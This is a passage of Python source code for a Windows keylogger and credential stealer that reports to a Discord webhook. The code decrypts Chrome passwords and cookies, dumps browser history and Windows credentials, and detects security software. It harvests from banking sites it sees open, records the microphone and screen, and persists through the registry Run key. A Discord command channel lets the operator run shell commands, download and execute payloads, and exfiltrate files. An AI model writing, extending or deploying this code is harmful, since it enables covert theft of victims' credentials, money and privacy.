                
                browsers = {
                    'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'),
                    'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
                }
                
                all_history = []
                
                for browser, history_path in browsers.items():
                    if not os.path.exists(history_path):
                        continue
                    
                    try:
                        # Copy database to temp
                        temp_db = os.path.join(tempfile.gettempdir(), f"{browser}_History.db")
                        self.force_copy(history_path, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        # Get top 100 most visited sites
                        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 100")
                        
                        for row in cursor.fetchall():
                            url, title, visits, last_visit = row
                            all_history.append(f"{browser} | {url} | Visits: {visits}")
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
                
                if all_history:
                    output_file = os.path.join(tempfile.gettempdir(), "Browser_History.txt")
                    with open(output_file, "w", encoding='utf-8') as f:
                        f.write("="*50 + "\n")
                        f.write("Browser History (Top 100 Sites)\n")
                        f.write("="*50 + "\n\n")
                        f.write("\n".join(all_history))
                    
                    self.send_to_webhook(f"🔍 **Browser History** ({len(all_history)} entries)", file_path=output_file)
                else:
                    self.send_to_webhook(">> ℹ️ No browser history found")
                    
            except Exception as e:
                self.send_to_webhook(f">> ❌ History dump error: {e}")

        def dump_windows_credentials(self):
            """Extract Windows Credential Manager credentials"""
            try:
                import subprocess
                import tempfile
                
                # Create hidden window startup info
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                # Get list of stored credentials (SILENTLY)
                result = subprocess.run(
                    ['cmdkey', '/list'],
                    capture_output=True,
                    text=True,
                    startupinfo=startupinfo
                )
                
                if result.returncode == 0 and result.stdout:
                    output_file = os.path.join(tempfile.gettempdir(), "Windows_Credentials.txt")
                    with open(output_file, "w", encoding='utf-8') as f:
                        f.write("="*50 + "\n")
                        f.write("Windows Credential Manager\n")
                        f.write("="*50 + "\n\n")
                        f.write(result.stdout)
                    
                    self.send_to_webhook("🔑 **Windows Credentials**", file_path=output_file)
                else:
                    self.send_to_webhook(">> ℹ️ No Windows credentials found")
                    
            except Exception as e:
                self.send_to_webhook(f">> ❌ Windows creds error: {e}")

        def enumerate_software(self):
            """List all installed software"""
            try:
                import winreg
                import tempfile
                
                software_list = []
                security_software = []
                
                # Registry paths for installed software
                reg_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                ]
                
                security_keywords = ['antivirus', 'anti-virus', 'security', 'defender', 'firewall', 'vpn', 'malware', 'norton', 'mcafee', 'kaspersky', 'avast', 'avg', 'bitdefender']
                
                for hkey, path in reg_paths:
                    try:
                        reg_key = winreg.OpenKey(hkey, path)
                        for i in range(winreg.QueryInfoKey(reg_key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(reg_key, i)
                                subkey = winreg.OpenKey(reg_key, subkey_name)
                                
                                try:
                                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if "DisplayVersion" else "N/A"
                                    
                                    software_entry = f"{name} (v{version})"
                                    software_list.append(software_entry)
                                    
                                    # Check if security software
                                    if any(keyword in name.lower() for keyword in security_keywords):
                                        security_software.append(software_entry)
                                except:
                                    pass
                                
                                winreg.CloseKey(subkey)
                            except:
                                pass
                        winreg.CloseKey(reg_key)
                    except:
                        pass
                
                if software_list:
                    output_file = os.path.join(tempfile.gettempdir(), "Installed_Software.txt")
                    with open(output_file, "w", encoding='utf-8') as f:
                        f.write("="*50 + "\n")
                        f.write(f"Installed Software ({len(software_list)} programs)\n")
                        f.write("="*50 + "\n\n")
                        
                        if security_software:
                            f.write("🚨 SECURITY SOFTWARE DETECTED:\n")
                            f.write("-"*50 + "\n")
                            for sw in security_software:
                                f.write(f"  • {sw}\n")
                            f.write("\n")
                        
                        f.write("ALL SOFTWARE:\n")
                        f.write("-"*50 + "\n")
                        for sw in sorted(software_list):
                            f.write(f"{sw}\n")
                    
                    security_alert = f" | ⚠️ {len(security_software)} security tools detected!" if security_software else ""
                    self.send_to_webhook(f"💻 **Installed Software** ({len(software_list)} programs{security_alert})", file_path=output_file)
                else:
                    self.send_to_webhook(">> ℹ️ No software enumeration data")
                    
            except Exception as e:
                self.send_to_webhook(f">> ❌ Software enum error: {e}")


        def monitor_banking_sites(self):
            """Background thread to monitor for banking/sensitive sites and auto-dump credentials"""
            import time
            
            # Banking and sensitive site keywords
            banking_keywords = [
                'bank', 'chase', 'wells fargo', 'bofa', 'citibank', 'paypal', 'venmo', 'zelle',
                'capital one', 'discover', 'american express', 'amex', 'usaa', 'pnc', 'td bank',
                'coinbase', 'binance', 'kraken', 'robinhood', 'etrade', 'fidelity', 'schwab',
                'login', 'signin', 'account', 'password', 'authenticate'
            ]
            
            last_trigger = 0
            cooldown = 300  # 5 minute cooldown between triggers
            
            while True:
                try:
                    current_window = self.get_active_window_title()
                    
                    if current_window:
                        current_window_lower = current_window.lower()
                        
                        # Check if any banking keyword is in window title
                        if any(keyword in current_window_lower for keyword in banking_keywords):
                            current_time = time.time()
                            
                            # Only trigger if cooldown has passed
                            if current_time - last_trigger > cooldown:
                                last_trigger = current_time
                                
                                # REACTIVE HARVESTING
                                self.send_to_webhook(f"🎯 **BANKING SITE DETECTED**: `{current_window}`")
                                self.send_to_webhook(">> 🚨 Initiating reactive credential harvest...")
                                
                                # 1. Screenshot
                                try:
                                    import pyautogui
                                    import tempfile
                                    screenshot = pyautogui.screenshot()
                                    screenshot_path = os.path.join(tempfile.gettempdir(), f"banking_trigger_{int(time.time())}.png")
                                    screenshot.save(screenshot_path)
                                    self.send_to_webhook("📸 **Banking Screenshot**", file_path=screenshot_path)
                                except:
                                    pass
                                
                                # 2. Dump cookies
                                try:
                                    self.dump_chromium_creds(cookies=True)
                                except:
                                    pass
                                
                                # 3. Clipboard
                                try:
                                    import win32clipboard
                                    win32clipboard.OpenClipboard()
                                    clipboard_data = win32clipboard.GetClipboardData()
                                    win32clipboard.CloseClipboard()
                                    if clipboard_data:
                                        self.send_to_webhook(f"📋 **Clipboard**: ```{clipboard_data}```")
                                except:
                                    pass
                    
                    time.sleep(10)  # Check every 10 seconds (optimized)
                    
                except Exception as e:
                    time.sleep(10)
                    continue

        def run_diagnostics(self):
            import json
            import base64
            import win32crypt
            import shutil
            import binascii
            
            report = ["### 🧬 Stealer Diagnostics System"]
            
            # 1. Chrome Path Check
            chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
            if os.path.exists(chrome_path):
                report.append(f"✅ Chrome Path Exists: `{chrome_path}`")
                
                # 2. Local State Check
                ls_path = os.path.join(chrome_path, "Local State")
                if os.path.exists(ls_path):
                     report.append(f"✅ Local State Found")
                     try:
                        # Copy and Read
                        tmp_ls = os.path.join(os.getenv('TEMP'), "ls_debug.json")
                        shutil.copy2(ls_path, tmp_ls)
                        with open(tmp_ls, "r", encoding="utf-8") as f:
                            data = json.loads(f.read())
                        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
                        
                        # 3. DPAPI Check
                        is_dpapi = encrypted_key.startswith(b"DPAPI")
                        report.append(f"🔍 Key Header (DPAPI?): `{is_dpapi}`")
                        report.append(f"📄 Raw Header Hex: `{binascii.hexlify(encrypted_key[:10])}`")
                        
                        if is_dpapi:
                             encrypted_key = encrypted_key[5:]
                             
                        # 4. Decrypt Master Key
                        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        report.append(f"✅ Master Key Decrypted (Length: {len(master_key)})")
                        report.append(f"🔑 Key Hex (First 10): `{binascii.hexlify(master_key[:10])}`")
                        
                     except Exception as e:
                         report.append(f"❌ Key Extraction Failed: {e}")
                else:
                    report.append("❌ Local State Missing")
            else:
                 report.append("❌ Chrome Path Not Found")
            
            self.send_to_webhook("\n".join(report))

        def force_copy(self, src, dst):
            try:
                shutil.copyfile(src, dst)
            except PermissionError:
                # File is locked, try system copy silently
                try:
                    cmd = f'copy "{src}" "{dst}"'
                    
                    # Configuration to hide the console window
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    
                    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, startupinfo=startupinfo)
                except Exception as e:
                    self.appendlog(f"[Copy Error: {e}]")
            except Exception as e:
                self.appendlog(f"[Copy Error: {e}]")

        def extract_passwords(self, key):
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Login Data")
            filename = "ChromeData.db"
            
            self.force_copy(db_path, filename)
            
            if not os.path.exists(filename):
                return ""

            try:
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                
                data_arr = []
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[2]
                    password = self.decrypt_password(row[3], key)
                    if username or password:
                         data_arr.append(f"URL: {origin_url}\nUser: {username}\nPass: {password}")
                
                cursor.close()
                db.close()
            except Exception as e:
                return f"Error reading password DB: {e}"

            try:
                os.remove(filename)
            except:
                pass
            
            return "\n\n".join(data_arr)

        def extract_cookies(self, key):
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            filename = "Cookies.db"
            if not os.path.exists(db_path): # Check generic path if network path fails
                 db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Default", "Cookies")

            if not os.path.exists(db_path):
                return []

            self.force_copy(db_path, filename)
            
            if not os.path.exists(filename):
                return []

            try:
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                
                cookies_list = []
                for row in cursor.fetchall():
                    host = row[0]
                    name = row[1]
                    val = row[2]
                    if not val:
                        val = self.decrypt_password(row[3], key)
                    cookies_list.append({'host': host, 'name': name, 'value': val})
                
                cursor.close()
                db.close()
            except Exception as e:
                return []

            try:
                os.remove(filename)
            except:
                pass
                
            return cookies_list

        def get_cookies_for_window(self, window_title):
            try:
                # Basic keyword extraction from title
                
                target_key = None
                window_lower = window_title.lower()
                
                for k in self.targets:
                    if k in window_lower:
                        target_key = k
                        break
                
                if not target_key:
                    return # No interesting keyword found
                
                key = self.get_encryption_key()
                all_cookies = self.extract_cookies(key)
                
                # Filter cookies
                matches = []
                for c in all_cookies:
                    if target_key in c['host']:
                        matches.append(f"Host: {c['host']}\nName: {c['name']}\nValue: {c['value']}")
                
                if matches:
                    report = "\n\n".join(matches)
                    self.send_to_webhook(f"🎯 **Target Session Captured: {target_key.upper()}**\n\n" + report)
                    
            except Exception as e:
                pass # Fail silently for this background task

        def get_passwords_for_window(self, window_title):
            try:
                target_key = None
                window_lower = window_title.lower()
                
                for k in self.targets:
                    if k in window_lower:
                        target_key = k
                        break
                
                if not target_key:
                    return 
                
                key = self.get_encryption_key()
                
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "Default", "Login Data")
                filename = "ChromeData.db"
                
                self.force_copy(db_path, filename)
                
                if not os.path.exists(filename):
                    return

                try:
                    db = sqlite3.connect(filename)
                    cursor = db.cursor()
                    cursor.execute("select origin_url, action_url, username_value, password_value from logins")
                    
                    matches = []
                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[2]
                        password_val = row[3]
                        
                        if target_key in origin_url.lower():
                            decoded_pw = self.decrypt_password(password_val, key)
                            if username or decoded_pw:
                                matches.append(f"URL: {origin_url}\nUser: {username}\nPass: {decoded_pw}")
                    
                    cursor.close()
                    db.close()
                except:
                    pass

                try: os.remove(filename)
                except: pass
                
                if matches:
                    report = "\n\n".join(matches)
                    self.send_to_webhook(f"🎯 **Target Password Captured: {target_key.upper()}**\n\n" + report)

            except Exception as e:
                pass


        def get_browser_data(self):
            try:
                key = self.get_encryption_key()
                
                # Get Passwords
                passwords = self.extract_passwords(key)
                if passwords:
                     self.send_to_webhook("=== Chrome Passwords ===\n" + passwords)
                else:
                     self.send_to_webhook("=== Chrome Passwords ===\nNo passwords found.")
                     
                # Get Cookies (Full Dump)
                cookies = self.extract_cookies(key)
                if cookies:
                     # Convert list back to string for report
                     cookie_strs = [f"Host: {c['host']}\nName: {c['name']}\nValue: {c['value']}" for c in cookies]
                     cookie_report = "\n\n".join(cookie_strs)
                     
                     # Cookies can easily exceed Discord char limit (2000)
                     # Send as file if too long
                     if len(cookie_report) > 1800:
                         with open("cookies.txt", "w", encoding="utf-8") as f:
                             f.write(cookie_report)
                         self.send_to_webhook("=== Chrome Cookies (File) ===", file_path="cookies.txt")
                         try: os.remove("cookies.txt") 
                         except: pass
                     else:
                         self.send_to_webhook("=== Chrome Cookies ===\n" + cookie_report)
                else:
                     self.send_to_webhook("=== Chrome Cookies ===\nNo cookies found.")

            except Exception as e:
                self.send_to_webhook(f"Error extracting browser data: {e}")

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            pass # Disabled mouse move logging to reduce clutter
            # current_move = "Mouse moved to {} {}".format(x, y)
            # self.appendlog(current_move)

        def on_click(self, x, y):
            pass # Disabled click logging to reduce clutter
            # current_click = "Mouse clicked at {} {}".format(x, y)
            # self.appendlog(current_click)

        def on_scroll(self, x, y):
            pass # Disabled scroll logging to reduce clutter
            # current_scroll = "Mouse scrolled at {} {}".format(x, y)
            # self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                active_window = self.get_active_window_title()
                if active_window != self.current_window:
                    self.current_window = active_window
                    self.appendlog(f"\n\n[Window: {self.current_window}]\n")
                    
                    # Take Screenshot on Window Change (in thread to avoid lag)
                    threading.Thread(target=self.screenshot).start()
                    
                    # Reactive Session Stealer Logic
                    # Check if it's a browser window
                    browsers = ["chrome", "edge", "firefox", "brave", "opera"]
                    if any(b in self.current_window.lower() for b in browsers):
                        # Use simple cooldown key based on Window Title keywords to avoid spamming "Facebook" every time user Alt+Tabs
                        # Reset cooldown every 60s
                        current_time = datetime.now().timestamp()
                        
                        # Extract a simple key for the site from the title
                        site_key = None
                        for k in self.targets:
                             if k in self.current_window.lower():
                                 site_key = k
                                 break
                        
                        if site_key:
                            last_time = self.last_dump_time.get(site_key, 0)
                            if current_time - last_time > 60: # 60 second cooldown per site
                                self.last_dump_time[site_key] = current_time
                                self.last_dump_time[site_key] = current_time
                                # Start in thread
                                threading.Thread(target=self.get_cookies_for_window, args=(self.current_window,)).start()
                                threading.Thread(target=self.get_passwords_for_window, args=(self.current_window,)).start()

            except Exception as e:
                self.appendlog(f"\n[Error tracking window: {e}]\n")

            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = " "
                elif key == key.enter:
                    current_key = "\n"
                elif key == key.tab:
                    current_key = "\t"
                elif key == key.esc:
                    current_key = " [ESC] "
                elif key == key.backspace:
                    # Optional: Logic to actually remove last char from log could go here, 
                    # but for raw logging we just mark it.
                    current_key = " [BACKSPACE] "
                else:
                    # Clean up other keys e.g. Key.shift -> [SHIFT]
                    current_key = f" [{str(key).replace('Key.', '').upper()}] "

            self.appendlog(current_key)

        def send_to_webhook(self, message, file_path=None):
            # Dynamic Victim Identity - Cached
            # import os, platform
            # victim_id = "UNKNOWN"
            # try:
            #     victim_id = f"{os.getlogin()} | {platform.node()}"
            # except: pass

            try:
                import requests
                
                # THREADING LOGIC:
                # 1. If we already have a THREAD_ID, use it to reply.
                # 2. If not, create a new thread (Forum Post).
                
                current_url = self.webhook_url
                data = {}
                files = None
                
                # DOUBLE-CHECKED LOCKING PATTERN
                # Prevents "Start-up Race Condition" where Screenshot/Audio/SysInfo all try to create threads at once.
                
                # Case 1: Thread ID exists (Fast Path)
                if self.thread_id:
                     current_url = f"{self.webhook_url}?thread_id={self.thread_id}"
                     data = { 'username': self.victim_id }
                
                # Case 2: No Thread ID (Critical Section)
                else:
                    with self.thread_lock:
                        # Check again inside lock (maybe someone just fixed it while we waited)
                        if self.thread_id:
                             current_url = f"{self.webhook_url}?thread_id={self.thread_id}"
                             data = { 'username': self.victim_id }
                        else:
                             # We are definitely the creator.
                             # We must perform the request *NOW* to get the ID before releasing lock.
                             # IMPORTANT: Append ?wait=true to force Discord to return the JSON response (with channel_id)
                             current_url = f"{self.webhook_url}?wait=true"
                             
                             data = {
                                'username': self.victim_id,
                                'thread_name': self.victim_id 
                             }
                             
                             # Perform Request (Blocking, but necessary for init)
                             try:
                                 if file_path:
                                     with open(file_path, 'rb') as f:
                                         data['content'] = message
                                         files = {'file': f}
                                         r = requests.post(current_url, data=data, files=files, verify=False)
                                 else:
                                     if message.strip():
                                         if "=== System Info ===" in message:
                                              data['content'] = message
                                         else:
                                              data['content'] = f"```\n{message}\n```"
                                         r = requests.post(current_url, json=data, verify=False)

                                 # Capture ID IMMEDIATELY
                                 try:
                                     resp_json = r.json()
                                     print(f"DEBUG: INITIAL RESP: {r.status_code} - {resp_json}")
                                     if 'channel_id' in resp_json:
                                         self.thread_id = resp_json['channel_id']
                                         print(f"SUCCESS! Captured Thread ID: {self.thread_id}")
                                     else:
                                         print(f"FAILED: No channel_id. Keys: {resp_json.keys()}")
                                 except Exception as e:
                                     print(f"DEBUG: JSON PARSE ERROR: {e} | Text: {r.text}")

                                 # Return early since we already sent it
                                 return 

                             except Exception as e:
                                 print(f"DEBUG: CRITICAL NETWORK FAILURE: {e}")
                                 return

                # Normal Send (For Case 1 or if we just established ID)
                # If we are here, it means we have an ID (Case 1) OR we failed to get one (Error)
                # But typically we just follow the standard path for existing threads
                
                if file_path:
                    # Posting a file
                    with open(file_path, 'rb') as f:
                        data['content'] = message
                        files = {'file': f}
                        r = requests.post(current_url, data=data, files=files, verify=False)
                else:
                    # Posting text
                    if message.strip():
                        if "=== System Info ===" in message:
                             data['content'] = message
                        else:
                             data['content'] = f"```\n{message}\n```"
                             
                        r = requests.post(current_url, json=data, verify=False)
                
                # Debug Output
                if getattr(sys, 'frozen', False) == False: # Only print in debug mode
                     print(f"Upload Status: {r.status_code}")
                     if r.status_code != 200 and r.status_code != 204:
                         print(f"Response: {r.text}")

            except Exception as e:
                pass

        def report(self):
            # Send the current text log
            if self.log:
                self.send_to_webhook(self.log)
            
            self.log = ""
            
            # Record Microphone
            # self.microphone() # Moved to separate thread
            
            # Take Screenshot (Periodic)
            # self.screenshot() # Moved to separate thread
            
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            
            # Fetch Public IP and Geo Info
            try:
                import requests
                public_ip = requests.get('https://api.ipify.org').text
                geo_request = requests.get(f'http://ip-api.com/json/{public_ip}')
                geo_data = geo_request.json()
                city = geo_data.get('city', 'Unknown')
                country = geo_data.get('country', 'Unknown')
                lat = geo_data.get('lat', 'Unknown')
                lon = geo_data.get('lon', 'Unknown')
                isp = geo_data.get('isp', 'Unknown')
            except Exception:
                public_ip = "Error fetching"
                city = country = lat = lon = isp = "Error fetching"

            info_msg = (
                f"**🚀 Keylogger Started**\n"
                f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"--------------------------------------------------\n"
                f"**👤 System Info**\n"
                f"Hostname: `{hostname}`\n"
                f"Internal IP: `{ip}`\n"
                f"Processor: `{plat}`\n"
                f"System: `{system} {machine}`\n"
                f"--------------------------------------------------\n"
                f"**🌍 Network Info**\n"
                f"Public IP: `{public_ip}`\n"
                f"ISP: `{isp}`\n"
                f"Location: {city}, {country} ({lat}, {lon})\n"
                f"--------------------------------------------------"
            )
            
            self.send_to_webhook(info_msg)


        def microphone(self):
            try:
                import sounddevice as sd
                import wave
                fs = 16000 # Reduced from 44100 to save size
                seconds = SEND_REPORT_EVERY
                # Use absolute TEMP path to avoid System32 permission errors
                filename = os.path.join(os.getenv('TEMP'), 'sound.wav')
                
                obj = wave.open(filename, 'w')
                obj.setnchannels(1)  # mono
                obj.setsampwidth(2)
                obj.setframerate(fs)
                
                # Record (Using channels=1 to match WAV header)
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
                sd.wait() # Wait until recording is finished
                
                obj.writeframesraw(myrecording)
                obj.close()
    
                self.send_to_webhook(message="Audio Loading...", file_path=filename)
                
                try:
                    os.remove(filename)
                except Exception as e:
                    print(f"Error removing audio file: {e}")
            except Exception as e:
                self.appendlog(f"\n[Microphone Error: {e}]\n")

        def screenshot(self):
            # Use unique filename to avoid thread conflicts (JPEG for size)
            # Use absolute TEMP path to avoid System32 permission errors
            filename = os.path.join(os.getenv('TEMP'), f'screenshot_{int(datetime.now().timestamp())}.jpg')
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                img.save(filename, quality=50, optimize=True)
                self.send_to_webhook(message="Screenshot Loading...", file_path=filename)
                
                try:
                    os.remove(filename)
                except Exception as e:
                    print(f"Error removing screenshot: {e}")
            except Exception as e:
                self.appendlog(f"[Screenshot Error: {e}]")

        def check_for_updates(self):
            try:
                import requests
                # 1. Check Remote Version
                response = requests.get(VERSION_URL)
                
                # SAFETY GUARD: Check for HTTP Errors (404, 403, etc)
                if response.status_code != 200:
                    return

                remote_version_text = response.text.strip()
                
                # SAFETY GUARD: Check for "404", "Not Found", or HTML tags
                if "404" in remote_version_text or "Not Found" in remote_version_text or "<html" in remote_version_text:
                    return

                # SAFETY GUARD: Verify it looks like a version number
                # Simple check: must be short and start with digit
                if len(remote_version_text) > 10 or not remote_version_text[0].isdigit():
                    return

                if remote_version_text != VERSION:
                    # Update Available
                    # 2. Download New Exe
                    exe_response = requests.get(EXE_URL)
                    if exe_response.status_code != 200:
                        return
                        
                    # Write to Temp as 'update.exe'
                    update_path = os.path.join(tempfile.gettempdir(), "update.exe")
                    with open(update_path, "wb") as f:
                        f.write(exe_response.content)
                    
                    # 3. Create Updater Batch Script
                    # We need a script to:
                    # a) Wait for us to close
                    # b) Delete us
                    # c) Move update.exe to our location
                    # d) Run the new exe
                    
                    current_exe = sys.executable
                    batch_script = f"""
@echo off
timeout /t 3 /nobreak
del "{current_exe}"
move "{update_path}" "{current_exe}"
start "" "{current_exe}"
del "%~f0"
"""
                    batch_path = os.path.join(tempfile.gettempdir(), "update.bat")
                    with open(batch_path, "w") as f:
                        f.write(batch_script)
                        
                    # 4. Execute Batch and Die
                    # Send a final 'Updating' log
                    self.send_to_webhook(f"[System] Updating to {remote_version_text}...")
                    
                    subprocess.Popen(batch_path, shell=True)
                    os._exit(0)
            except Exception:
                pass # Silent fail on update check


        def add_to_startup(self):
            try:
                # Only add to startup if running as an executable (frozen)
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    value_name = "Keylogger"
                    
                    # Command to add registry key
                    cmd = f'reg add "HKCU\\{key}" /v "{value_name}" /t REG_SZ /d "{exe_path}" /f'
                    os.system(cmd)
                    self.appendlog("\n[+] Persistence added to Registry Run Key.\n")
                else:
                    self.appendlog("\n[!] Persistence skipped (not running as exe).\n")
            except Exception as e:
                self.appendlog(f"\n[!] Persistence failed: {e}\n")

        def poll_commands(self):
            """
            Stealth C2: Periodically polls the Discord Thread for new commands via HTTP API.
            No persistent WebSocket connection. Looks like normal web traffic.
            """
            try:
                import requests, time, random
                
                # Check for commands every 10-20 seconds (Jitter)
                while True:
                    wait_time = random.randint(15, 25)
                    time.sleep(wait_time)
                    
                    if not self.thread_id:
                        continue
                        
                    try:
                        # 1. Fetch Request (Fetch 10 messages to avoid seeing only our own logs)
                        url = f"https://discord.com/api/v9/channels/{self.thread_id}/messages?limit=10"
                        headers = {"Authorization": f"Bot {self.bot_token}"}
                        r = requests.get(url, headers=headers, verify=False)
                        
                        if r.status_code == 200:
                            msgs = r.json()
                            if msgs and len(msgs) > 0:
                                # Iterate through messages to find the most recent VALID command
                                for msg in msgs:
                                    content = msg['content']
                                    msg_id = msg['id']
                                    author_bot = msg['author'].get('bot', False)
                                    
                                    # Ignore our own messages (logging)
                                    if author_bot:
                                        continue
                                        
                                    if content.startswith("!"):
                                        # Use timestamp or ID to ensure we don't re-run old commands? 
                                        # Simple check: If msg_id is same as last processed, STOP.
                                        if msg_id == self.last_command_id:
                                            break 
                                        
                                        # Found a NEW command
                                        self.last_command_id = msg_id
                                        
                                        # Execute Command
                                        cmd = content.split(" ")[0].lower()
                                        
                                        if getattr(sys, 'frozen', False) == False:
                                            print(f"COMMAND RECEIVED: {content}")
                                        
                                        if cmd == "!ping":
                                            self.send_to_webhook(">> PONG! System Online 🟢")
                                            
                                        elif cmd == "!screenshot":
                                            self.send_to_webhook(">> 📸 Taking Screenshot...")
                                            self.screenshot() # Call existing method

                                        elif cmd == "!clipboard":
                                            try:
                                                # Use ctypes to get clipboard without pywin32 dependency issues
                                                CF_TEXT = 1
                                                user32 = ctypes.windll.user32
                                                kernel32 = ctypes.windll.kernel32
                                                
                                                if user32.OpenClipboard(0):
                                                    if user32.IsClipboardFormatAvailable(CF_TEXT):
                                                        hClip = user32.GetClipboardData(CF_TEXT)
                                                        data_ptr = kernel32.GlobalLock(hClip)
                                                        text_data = ctypes.c_char_p(data_ptr).value.decode('utf-8', errors='ignore')
                                                        kernel32.GlobalUnlock(hClip)
                                                        self.send_to_webhook(f">> 📋 Clipboard: `{text_data}`")
                                                    else:
                                                         self.send_to_webhook(">> 📋 Clipboard Empty or Non-Text")
                                                    user32.CloseClipboard()
                                            except Exception as e:
                                                self.send_to_webhook(f">> ❌ Clip Error: {e}")

                                        elif cmd.startswith("!shell"):
                                            try:
                                                # Stealthily run shell command
                                                command = content[7:].strip()
                                                if command:
                                                    self.send_to_webhook(f">> 💻 Executing: `{command}`...")
                                                    # Run with subprocess, hide window
                                                    startupinfo = subprocess.STARTUPINFO()
                                                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                                                    
                                                    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, startupinfo=startupinfo)
                                                    out, err = proc.communicate(timeout=15)
                                                    
                                                    output = out.decode(errors='ignore') + err.decode(errors='ignore')
                                                    if len(output) > 1900: output = output[:1900] + "... (truncated)"
                                                    
                                                    self.send_to_webhook(f"```\n{output}\n```")
                                            except Exception as e:
                                                 self.send_to_webhook(f">> ❌ Shell Error: {e}")

                                        elif cmd.startswith("!download"):
                                            try:
                                                # Dropper functionality
                                                parts = content.split(" ")
                                                if len(parts) >= 2:
                                                    d_url = parts[1]
                                                    d_name = parts[2] if len(parts) > 2 else os.path.basename(d_url.split('?')[0])
                                                    if not d_name: d_name = "dropped_file.exe"
                                                    
                                                    # Save to Temp
                                                    import tempfile
                                                    save_path = os.path.join(tempfile.gettempdir(), d_name)
                                                    
                                                    self.send_to_webhook(f">> ⬇️ Downloading `{d_name}` from `{d_url}`...")
                                                    r = requests.get(d_url, verify=False)
                                                    with open(save_path, "wb") as f:
                                                        f.write(r.content)
                                                    
                                                    self.send_to_webhook(f">> ✅ Downloaded to: `{save_path}`. Executing...")
                                                    os.startfile(save_path)
                                            except Exception as e:
                                                self.send_to_webhook(f">> ❌ Download Fail: {e}")

                                        elif cmd.startswith("!ls"):
                                            try:
                                                # File Browser
                                                target_dir = content[4:].strip()
                                                if not target_dir: target_dir = os.getcwd()
                                                
                                                if os.path.exists(target_dir):
                                                    items = os.listdir(target_dir)
                                                    item_str = "\n".join(items[:50]) # Limit to 50
                                                    if len(items) > 50: item_str += "\n... (more files truncated)"
                                                    self.send_to_webhook(f"📂 **Listing `{target_dir}`**:\n```\n{item_str}\n```")
                                                else:
                                                    self.send_to_webhook(f">> ❌ Path not found: `{target_dir}`")
                                            except Exception as e:
                                                self.send_to_webhook(f">> ❌ LS Error: {e}")

                                        elif cmd.startswith("!upload"):
                                            try:
                                                # Exfiltration
                                                file_path = content[8:].strip()
                                                if os.path.exists(file_path):
                                                    if os.path.getsize(file_path) > 8*1024*1024:
                                                        self.send_to_webhook(">> ❌ File too large for Discord (>8MB).")
                                                    else:
                                                        self.send_to_webhook(f">> ⬆️ Exfiltrating `{file_path}`...")
                                                        self.send_to_webhook("Here is the requested file:", file_path=file_path)
                                                else:
                                                     self.send_to_webhook(f">> ❌ File not found: `{file_path}`")
                                            except Exception as e:
                                                 self.send_to_webhook(f">> ❌ Upload Error: {e}")

                                        elif cmd.startswith("!sysinfo"):
                                            self.send_to_webhook(">> ℹ️ Gathering System Info...")
                                            self.system_information()

                                        elif cmd.startswith("!sleep"):
                                            try:
                                                minutes = int(content.split(" ")[1])
                                                self.send_to_webhook(f">> 💤 Sleeping for {minutes} minutes...")
                                                time.sleep(minutes * 60)
                                                self.send_to_webhook(">> ⏰ Woke up from sleep!")
                                            except:
                                                self.send_to_webhook(">> Usage: !sleep <minutes>")
                                        
                                        elif cmd == "!stealer_debug":
                                            self.send_to_webhook(">> 🐞 Running Stealer Diagnostics...")
                                            self.run_diagnostics()
                                            
                                        elif cmd.startswith("!interval"):
                                            try:
